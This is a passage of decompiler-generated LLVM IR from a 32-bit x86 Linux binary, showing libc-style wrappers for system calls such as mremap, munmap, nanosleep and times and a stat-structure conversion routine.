dec_label_pc_8052034:                             ; preds = %dec_label_pc_8052020
  %v1_8052034 = call i32 @function_8050089(i32 %v0_8052020)
  %v0_8052039 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052039 = sub i32 0, %v0_8052039
  %v2_805203b = inttoptr i32 %v1_8052034 to i32*
  store i32 %v1_8052039, i32* %v2_805203b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052044.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052040

dec_label_pc_8052040:                             ; preds = %dec_label_pc_8052020, %dec_label_pc_8052034
  %v2_8052044 = phi i32 [ %v0_8052020, %dec_label_pc_8052020 ], [ %v2_8052044.pre, %dec_label_pc_8052034 ]
  %v0_8052040 = phi i32 [ %v1_8052029, %dec_label_pc_8052020 ], [ -1, %dec_label_pc_8052034 ]
  store i32 %v2_8052044, i32* @ebx, align 4
  ret i32 %v0_8052040

; uselistorder directives
  uselistorder i32 %v1_8052029, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052040, { 1, 0 }
}

define i32 @function_8052046() local_unnamed_addr {
dec_label_pc_8052046:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052046 = load i32, i32* @ebx, align 4
  store i32 %v0_8052046, i32* %stack_var_-4, align 4
  %v1_805204f = call i32 @int80_syscall(i32 200)
  store i32 %v1_805204f, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805204f, -4095
  br i1 %tmp7, label %dec_label_pc_8052066, label %dec_label_pc_805205a

dec_label_pc_805205a:                             ; preds = %dec_label_pc_8052046
  %v1_805205a = call i32 @function_8050089(i32 %v0_8052046)
  %v0_805205f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805205f = sub i32 0, %v0_805205f
  %v2_8052061 = inttoptr i32 %v1_805205a to i32*
  store i32 %v1_805205f, i32* %v2_8052061, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805206a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052066

dec_label_pc_8052066:                             ; preds = %dec_label_pc_8052046, %dec_label_pc_805205a
  %v2_805206a = phi i32 [ %v0_8052046, %dec_label_pc_8052046 ], [ %v2_805206a.pre, %dec_label_pc_805205a ]
  %v0_8052066 = phi i32 [ %v1_805204f, %dec_label_pc_8052046 ], [ -1, %dec_label_pc_805205a ]
  store i32 %v2_805206a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052066

; uselistorder directives
  uselistorder i32 %v1_805204f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052066, { 1, 0 }
}

define i32 @function_805206c() local_unnamed_addr {
dec_label_pc_805206c:
  %v0_805206c = load i32, i32* @global_var_80530ec.221, align 4
  %v1_8052076 = icmp eq i32 %v0_805206c, 0
  br i1 %v1_8052076, label %dec_label_pc_805207c, label %dec_label_pc_805207a

dec_label_pc_805207a:                             ; preds = %dec_label_pc_805206c
  br label %dec_label_pc_805207c

dec_label_pc_805207c:                             ; preds = %dec_label_pc_805206c, %dec_label_pc_805207a
  %storemerge = phi i32 [ %v0_805206c, %dec_label_pc_805207a ], [ 4096, %dec_label_pc_805206c ]
  %v0_805207c = phi i32 [ %v0_805206c, %dec_label_pc_805207a ], [ 4096, %dec_label_pc_805206c ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805207c

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_805207c, { 1, 0 }
}

define i32 @function_805207f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805207f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805207f = load i32, i32* @ebx, align 4
  store i32 %v0_805207f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8052092 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8052092, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052092, -4095
  br i1 %tmp9, label %dec_label_pc_80520ab, label %dec_label_pc_805209f

dec_label_pc_805209f:                             ; preds = %dec_label_pc_805207f
  %v1_805209f = call i32 @function_8050089(i32 %v0_805207f)
  %v0_80520a4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520a4 = sub i32 0, %v0_80520a4
  %v2_80520a6 = inttoptr i32 %v1_805209f to i32*
  store i32 %v1_80520a4, i32* %v2_80520a6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80520af.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80520ab

dec_label_pc_80520ab:                             ; preds = %dec_label_pc_805207f, %dec_label_pc_805209f
  %v2_80520af = phi i32 [ %v0_805207f, %dec_label_pc_805207f ], [ %v2_80520af.pre, %dec_label_pc_805209f ]
  %v0_80520ab = phi i32 [ %v1_8052092, %dec_label_pc_805207f ], [ -1, %dec_label_pc_805209f ]
  store i32 %v2_80520af, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80520ab

; uselistorder directives
  uselistorder i32 %v1_8052092, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520ab, { 1, 0 }
}

define i32 @function_80520b1() local_unnamed_addr {
dec_label_pc_80520b1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520b1 = load i32, i32* @ebx, align 4
  store i32 %v0_80520b1, i32* %stack_var_-4, align 4
  %v1_80520ba = call i32 @int80_syscall(i32 199)
  store i32 %v1_80520ba, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80520ba, -4095
  br i1 %tmp7, label %dec_label_pc_80520d1, label %dec_label_pc_80520c5

dec_label_pc_80520c5:                             ; preds = %dec_label_pc_80520b1
  %v1_80520c5 = call i32 @function_8050089(i32 %v0_80520b1)
  %v0_80520ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520ca = sub i32 0, %v0_80520ca
  %v2_80520cc = inttoptr i32 %v1_80520c5 to i32*
  store i32 %v1_80520ca, i32* %v2_80520cc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80520d5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80520d1

dec_label_pc_80520d1:                             ; preds = %dec_label_pc_80520b1, %dec_label_pc_80520c5
  %v2_80520d5 = phi i32 [ %v0_80520b1, %dec_label_pc_80520b1 ], [ %v2_80520d5.pre, %dec_label_pc_80520c5 ]
  %v0_80520d1 = phi i32 [ %v1_80520ba, %dec_label_pc_80520b1 ], [ -1, %dec_label_pc_80520c5 ]
  store i32 %v2_80520d5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80520d1

; uselistorder directives
  uselistorder i32 %v1_80520ba, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520d1, { 1, 0 }
}

define i32 @function_80520d7(i32 %arg1) local_unnamed_addr {
dec_label_pc_80520d7:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_80520ed = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80520ed, i32* %esi.global-to-local, align 4
  %v1_8052104 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8052104, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8052104, -4095
  br i1 %tmp18, label %dec_label_pc_805211e, label %dec_label_pc_8052110

dec_label_pc_8052110:                             ; preds = %dec_label_pc_80520d7
  %v2_80520f1 = ashr i32 %tmp8, 31
  %v1_8052110 = call i32 @function_8050089(i32 %v2_80520f1)
  %v0_8052115 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052115 = sub i32 0, %v0_8052115
  %v2_8052117 = inttoptr i32 %v1_8052110 to i32*
  store i32 %v1_8052115, i32* %v2_8052117, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052122

dec_label_pc_805211e:                             ; preds = %dec_label_pc_80520d7
  %v1_805211e = icmp eq i32 %v1_8052104, 0
  br i1 %v1_805211e, label %dec_label_pc_8052127, label %dec_label_pc_8052122

dec_label_pc_8052122:                             ; preds = %dec_label_pc_805211e, %dec_label_pc_8052110
  %v0_8052122 = phi i32 [ %v1_8052104, %dec_label_pc_805211e ], [ -1, %dec_label_pc_8052110 ]
  %v1_8052124 = ashr i32 %v0_8052122, 31
  br label %dec_label_pc_805212f

dec_label_pc_8052127:                             ; preds = %dec_label_pc_805211e
  %v3_8052127 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805212f

dec_label_pc_805212f:                             ; preds = %dec_label_pc_8052122, %dec_label_pc_8052127
  %v0_8052135 = phi i32 [ %v0_8052122, %dec_label_pc_8052122 ], [ %v3_8052127, %dec_label_pc_8052127 ]
  %storemerge = phi i32 [ %v1_8052124, %dec_label_pc_8052122 ], [ %tmp, %dec_label_pc_8052127 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8052135

; uselistorder directives
  uselistorder i32 %v1_8052104, { 1, 2, 0, 3 }
  uselistorder i32 31, { 8, 9, 6, 1, 2, 3, 4, 7, 5, 0, 10 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805212f, { 1, 0 }
}

define i32 @function_8052136(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8052136:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052137 = load i32, i32* @esi, align 4
  store i32 %v0_8052137, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805214f = load i32, i32* @ebx, align 4
  %v5_8052157 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8052157 = ptrtoint i32* %v5_8052157 to i32
  store i32 %v0_805214f, i32* @ebx, align 4
  store i32 %v6_8052157, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8052157, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8052163, label %dec_label_pc_805216f

dec_label_pc_8052163:                             ; preds = %dec_label_pc_8052136
  %v1_8052163 = call i32 @function_8050089(i32 %v0_805214f)
  %v0_8052168 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052168 = sub i32 0, %v0_8052168
  %v2_805216a = inttoptr i32 %v1_8052163 to i32*
  store i32 %v1_8052168, i32* %v2_805216a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052172.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805216f

dec_label_pc_805216f:                             ; preds = %dec_label_pc_8052136, %dec_label_pc_8052163
  %v2_8052172 = phi i32 [ %v0_8052137, %dec_label_pc_8052136 ], [ %v2_8052172.pre, %dec_label_pc_8052163 ]
  %v0_805216f = phi i32 [ %v6_8052157, %dec_label_pc_8052136 ], [ -1, %dec_label_pc_8052163 ]
  %v2_8052171 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052171, i32* @edx, align 4
  store i32 %v2_8052172, i32* @esi, align 4
  ret i32 %v0_805216f

; uselistorder directives
  uselistorder i32 %v0_805214f, { 1, 0 }
  uselistorder label %dec_label_pc_805216f, { 1, 0 }
}

define i32 @function_8052175(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052175:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052175 = load i32, i32* @ebx, align 4
  store i32 %v0_8052175, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8052188 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8052188, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8052188, -4095
  br i1 %tmp10, label %dec_label_pc_80521a1, label %dec_label_pc_8052195

dec_label_pc_8052195:                             ; preds = %dec_label_pc_8052175
  %v1_8052195 = call i32 @function_8050089(i32 %v0_8052175)
  %v0_805219a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805219a = sub i32 0, %v0_805219a
  %v2_805219c = inttoptr i32 %v1_8052195 to i32*
  store i32 %v1_805219a, i32* %v2_805219c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521a5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521a1

dec_label_pc_80521a1:                             ; preds = %dec_label_pc_8052175, %dec_label_pc_8052195
  %v2_80521a5 = phi i32 [ %v0_8052175, %dec_label_pc_8052175 ], [ %v2_80521a5.pre, %dec_label_pc_8052195 ]
  %v0_80521a1 = phi i32 [ %v3_8052188, %dec_label_pc_8052175 ], [ -1, %dec_label_pc_8052195 ]
  %v2_80521a3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80521a3, i32* @edx, align 4
  store i32 %v2_80521a5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80521a1

; uselistorder directives
  uselistorder i32 %v3_8052188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521a1, { 1, 0 }
}

define i32 @function_80521a7(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80521a7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80521a7, i32* %stack_var_-4, align 4
  %v4_80521ab = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80521ab, i32* %ebx.global-to-local, align 4
  %v6_80521ba = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_80521ba, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80521ba, -4095
  br i1 %tmp11, label %dec_label_pc_80521d3, label %dec_label_pc_80521c7

dec_label_pc_80521c7:                             ; preds = %dec_label_pc_80521a7
  %v1_80521c7 = call i32 @function_8050089(i32 %v0_80521a7)
  %v0_80521cc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521cc = sub i32 0, %v0_80521cc
  %v2_80521ce = inttoptr i32 %v1_80521c7 to i32*
  store i32 %v1_80521cc, i32* %v2_80521ce, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521d7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521d3

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_80521a7, %dec_label_pc_80521c7
  %v2_80521d7 = phi i32 [ %v0_80521a7, %dec_label_pc_80521a7 ], [ %v2_80521d7.pre, %dec_label_pc_80521c7 ]
  %v0_80521d3 = phi i32 [ %v6_80521ba, %dec_label_pc_80521a7 ], [ -1, %dec_label_pc_80521c7 ]
  %v2_80521d5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80521d5, i32* @edx, align 4
  store i32 %v2_80521d7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80521d3

; uselistorder directives
  uselistorder i32 %v6_80521ba, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521d3, { 1, 0 }
}

define i32 @function_80521d9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80521d9:
  %stack_var_-12 = alloca i32, align 4
  %v0_80521da = load i32, i32* @ebx, align 4
  %v0_80521de = load i32, i32* @global_var_8053100.228, align 256
  %v1_80521de = icmp eq i32 %v0_80521de, 0
  %v1_80521e9 = icmp eq i1 %v1_80521de, false
  br i1 %v1_80521e9, label %dec_label_pc_80521fc, label %dec_label_pc_80521eb

dec_label_pc_80521eb:                             ; preds = %dec_label_pc_80521d9
  %v1_80521f0 = call i32 @function_805239f(i32 0)
  %v2_80521f8 = icmp slt i32 %v1_80521f0, 0
  br i1 %v2_80521f8, label %dec_label_pc_805221e, label %dec_label_pc_80521eb.dec_label_pc_80521fc_crit_edge

dec_label_pc_80521eb.dec_label_pc_80521fc_crit_edge: ; preds = %dec_label_pc_80521eb
  %v0_80521fe.pre = load i32, i32* @global_var_8053100.228, align 256
  br label %dec_label_pc_80521fc

dec_label_pc_80521fc:                             ; preds = %dec_label_pc_80521eb.dec_label_pc_80521fc_crit_edge, %dec_label_pc_80521d9
  %v0_805220c = phi i32 [ %v0_80521fe.pre, %dec_label_pc_80521eb.dec_label_pc_80521fc_crit_edge ], [ %v0_80521de, %dec_label_pc_80521d9 ]
  %v1_80521fc = icmp eq i32 %arg1, 0
  %v1_8052203 = icmp eq i1 %v1_80521fc, false
  br i1 %v1_8052203, label %dec_label_pc_8052209, label %dec_label_pc_8052205

dec_label_pc_8052205:                             ; preds = %dec_label_pc_80521fc
  br label %dec_label_pc_8052221

dec_label_pc_8052209:                             ; preds = %dec_label_pc_80521fc
  store i32 %v0_805220c, i32* @ebx, align 4
  %v2_805220e = add i32 %v0_805220c, %arg1
  %v1_8052212 = call i32 @function_805239f(i32 %v2_805220e)
  %v2_805221a = icmp slt i32 %v1_8052212, 0
  %v1_805221c = icmp eq i1 %v2_805221a, false
  br i1 %v1_805221c, label %dec_label_pc_8052209.dec_label_pc_8052221_crit_edge, label %dec_label_pc_805221e

dec_label_pc_8052209.dec_label_pc_8052221_crit_edge: ; preds = %dec_label_pc_8052209
  %v0_8052221.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052221

dec_label_pc_805221e:                             ; preds = %dec_label_pc_8052209, %dec_label_pc_80521eb
  br label %dec_label_pc_8052221

dec_label_pc_8052221:                             ; preds = %dec_label_pc_8052209.dec_label_pc_8052221_crit_edge, %dec_label_pc_8052205, %dec_label_pc_805221e
  %v0_8052221 = phi i32 [ %v0_8052221.pre, %dec_label_pc_8052209.dec_label_pc_8052221_crit_edge ], [ %v0_805220c, %dec_label_pc_8052205 ], [ -1, %dec_label_pc_805221e ]
  %v2_8052223 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052223, i32* @edx, align 4
  store i32 %v0_80521da, i32* @ebx, align 4
  ret i32 %v0_8052221

; uselistorder directives
  uselistorder i32 %v0_805220c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805239f, { 1, 0 }
  uselistorder label %dec_label_pc_8052221, { 2, 0, 1 }
}

define i32 @function_8052227(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8052227:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052227 = load i32, i32* @edi, align 4
  store i32 %v0_8052227, i32* %stack_var_-4, align 4
  %v4_805222b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805222b, i32* %edi.global-to-local, align 4
  %v0_805222f = load i32, i32* @ebx, align 4
  %v3_8052237 = call i32 @times(%tms* %arg1)
  store i32 %v3_8052237, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052237, -4095
  br i1 %tmp9, label %dec_label_pc_805224f, label %dec_label_pc_8052243

dec_label_pc_8052243:                             ; preds = %dec_label_pc_8052227
  %v1_8052243 = call i32 @function_8050089(i32 %v0_805222f)
  %v0_8052248 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052248 = sub i32 0, %v0_8052248
  %v2_805224a = inttoptr i32 %v1_8052243 to i32*
  store i32 %v1_8052248, i32* %v2_805224a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052253.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805224f

dec_label_pc_805224f:                             ; preds = %dec_label_pc_8052227, %dec_label_pc_8052243
  %v2_8052253 = phi i32 [ %v0_8052227, %dec_label_pc_8052227 ], [ %v2_8052253.pre, %dec_label_pc_8052243 ]
  %v0_805224f = phi i32 [ %v3_8052237, %dec_label_pc_8052227 ], [ -1, %dec_label_pc_8052243 ]
  store i32 %v2_8052253, i32* %edi.global-to-local, align 4
  ret i32 %v0_805224f

; uselistorder directives
  uselistorder i32 %v3_8052237, { 1, 0, 2 }
  uselistorder i32* @edi, { 6, 31, 32, 33, 34, 35, 91, 5, 92, 93, 94, 95, 0, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 10, 11, 12, 13, 14, 15, 16, 17, 18, 114, 128, 129, 115, 116, 117, 118, 119, 120, 121, 122, 1, 123, 124, 125, 126, 127, 130, 131, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 7, 49, 50, 132, 133, 51, 52, 53, 54, 8, 134, 135, 9, 136, 137, 138, 139, 55, 2, 56, 57, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 89, 90, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 162, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805224f, { 1, 0 }
}

define i32 @function_8052255(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052255:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052256 = load i32, i32* @ebx, align 4
  store i32 %v0_8052256, i32* %stack_var_-8, align 4
  %v4_805225a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805225a, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8052267 = inttoptr i32 %arg2 to i8*
  %v4_8052267 = call i32 @function_80500da(i8* %v3_8052267, i32 0, i32 88)
  store i32 %v4_8052267, i32* %eax.global-to-local, align 4
  %v2_805226c = load i16, i16* %arg1, align 2
  %v3_805226c = zext i16 %v2_805226c to i32
  store i32 %v3_805226c, i32* %eax.global-to-local, align 4
  %v0_805226f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805226f = add i32 %v0_805226f, 4
  %v2_805226f = inttoptr i32 %v1_805226f to i32*
  store i32 0, i32* %v2_805226f, align 4
  %v0_8052276 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052276 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052276 = inttoptr i32 %v1_8052276 to i32*
  store i32 %v0_8052276, i32* %v2_8052276, align 4
  %v0_8052278 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052278 = add i32 %v0_8052278, 4
  %v2_8052278 = inttoptr i32 %v1_8052278 to i32*
  %v3_8052278 = load i32, i32* %v2_8052278, align 4
  store i32 %v3_8052278, i32* %eax.global-to-local, align 4
  %v1_805227b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805227b = add i32 %v1_805227b, 12
  %v3_805227b = inttoptr i32 %v2_805227b to i32*
  store i32 %v3_8052278, i32* %v3_805227b, align 4
  %v0_805227e = load i32, i32* %esi.global-to-local, align 4
  %v1_805227e = add i32 %v0_805227e, 8
  %v2_805227e = inttoptr i32 %v1_805227e to i16*
  %v3_805227e = load i16, i16* %v2_805227e, align 2
  %v4_805227e = zext i16 %v3_805227e to i32
  store i32 %v4_805227e, i32* %eax.global-to-local, align 4
  %v1_8052282 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052282 = add i32 %v1_8052282, 16
  %v3_8052282 = inttoptr i32 %v2_8052282 to i32*
  store i32 %v4_805227e, i32* %v3_8052282, align 4
  %v0_8052285 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052285 = add i32 %v0_8052285, 10
  %v2_8052285 = inttoptr i32 %v1_8052285 to i16*
  %v3_8052285 = load i16, i16* %v2_8052285, align 2
  %v4_8052285 = zext i16 %v3_8052285 to i32
  store i32 %v4_8052285, i32* %eax.global-to-local, align 4
  %v1_8052289 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052289 = add i32 %v1_8052289, 20
  %v3_8052289 = inttoptr i32 %v2_8052289 to i32*
  store i32 %v4_8052285, i32* %v3_8052289, align 4
  %v0_805228c = load i32, i32* %esi.global-to-local, align 4
  %v1_805228c = add i32 %v0_805228c, 12
  %v2_805228c = inttoptr i32 %v1_805228c to i16*
  %v3_805228c = load i16, i16* %v2_805228c, align 2
  %v4_805228c = zext i16 %v3_805228c to i32
  store i32 %v4_805228c, i32* %eax.global-to-local, align 4
  %v1_8052290 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052290 = add i32 %v1_8052290, 24
  %v3_8052290 = inttoptr i32 %v2_8052290 to i32*
  store i32 %v4_805228c, i32* %v3_8052290, align 4
  %v0_8052293 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052293 = add i32 %v0_8052293, 14
  %v2_8052293 = inttoptr i32 %v1_8052293 to i16*
  %v3_8052293 = load i16, i16* %v2_8052293, align 2
  %v4_8052293 = zext i16 %v3_8052293 to i32
  store i32 %v4_8052293, i32* %eax.global-to-local, align 4
  %v1_8052297 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052297 = add i32 %v1_8052297, 28
  %v3_8052297 = inttoptr i32 %v2_8052297 to i32*
  store i32 %v4_8052293, i32* %v3_8052297, align 4
  %v0_805229a = load i32, i32* %esi.global-to-local, align 4
  %v1_805229a = add i32 %v0_805229a, 16
  %v2_805229a = inttoptr i32 %v1_805229a to i16*
  %v3_805229a = load i16, i16* %v2_805229a, align 2
  %v4_805229a = zext i16 %v3_805229a to i32
  store i32 %v4_805229a, i32* %eax.global-to-local, align 4
  %v0_805229e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805229e = add i32 %v0_805229e, 36
  %v2_805229e = inttoptr i32 %v1_805229e to i32*
  store i32 0, i32* %v2_805229e, align 4
  %v0_80522a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80522a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522a5 = add i32 %v1_80522a5, 32
  %v3_80522a5 = inttoptr i32 %v2_80522a5 to i32*
  store i32 %v0_80522a5, i32* %v3_80522a5, align 4
  %v0_80522a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522a8 = add i32 %v0_80522a8, 20
  %v2_80522a8 = inttoptr i32 %v1_80522a8 to i32*
  %v3_80522a8 = load i32, i32* %v2_80522a8, align 4
  store i32 %v3_80522a8, i32* %eax.global-to-local, align 4
  %v1_80522ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522ab = add i32 %v1_80522ab, 44
  %v3_80522ab = inttoptr i32 %v2_80522ab to i32*
  store i32 %v3_80522a8, i32* %v3_80522ab, align 4
  %v0_80522ae = load i32, i32* %esi.global-to-local, align 4
  %v1_80522ae = add i32 %v0_80522ae, 24
  %v2_80522ae = inttoptr i32 %v1_80522ae to i32*
  %v3_80522ae = load i32, i32* %v2_80522ae, align 4
  store i32 %v3_80522ae, i32* %eax.global-to-local, align 4
  %v1_80522b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522b1 = add i32 %v1_80522b1, 48
  %v3_80522b1 = inttoptr i32 %v2_80522b1 to i32*
  store i32 %v3_80522ae, i32* %v3_80522b1, align 4
  %v0_80522b4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522b4 = add i32 %v0_80522b4, 28
  %v2_80522b4 = inttoptr i32 %v1_80522b4 to i32*
  %v3_80522b4 = load i32, i32* %v2_80522b4, align 4
  store i32 %v3_80522b4, i32* %eax.global-to-local, align 4
  %v1_80522b7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522b7 = add i32 %v1_80522b7, 52
  %v3_80522b7 = inttoptr i32 %v2_80522b7 to i32*
  store i32 %v3_80522b4, i32* %v3_80522b7, align 4
  %v0_80522ba = load i32, i32* %esi.global-to-local, align 4
  %v1_80522ba = add i32 %v0_80522ba, 32
  %v2_80522ba = inttoptr i32 %v1_80522ba to i32*
  %v3_80522ba = load i32, i32* %v2_80522ba, align 4
  store i32 %v3_80522ba, i32* %eax.global-to-local, align 4
  %v1_80522bd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522bd = add i32 %v1_80522bd, 56
  %v3_80522bd = inttoptr i32 %v2_80522bd to i32*
  store i32 %v3_80522ba, i32* %v3_80522bd, align 4
  %v0_80522c0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522c0 = add i32 %v0_80522c0, 40
  %v2_80522c0 = inttoptr i32 %v1_80522c0 to i32*
  %v3_80522c0 = load i32, i32* %v2_80522c0, align 4
  store i32 %v3_80522c0, i32* %eax.global-to-local, align 4
  %v1_80522c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522c3 = add i32 %v1_80522c3, 64
  %v3_80522c3 = inttoptr i32 %v2_80522c3 to i32*
  store i32 %v3_80522c0, i32* %v3_80522c3, align 4
  %v0_80522c6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522c6 = add i32 %v0_80522c6, 48
  %v2_80522c6 = inttoptr i32 %v1_80522c6 to i32*
  %v3_80522c6 = load i32, i32* %v2_80522c6, align 4
  store i32 %v3_80522c6, i32* %eax.global-to-local, align 4
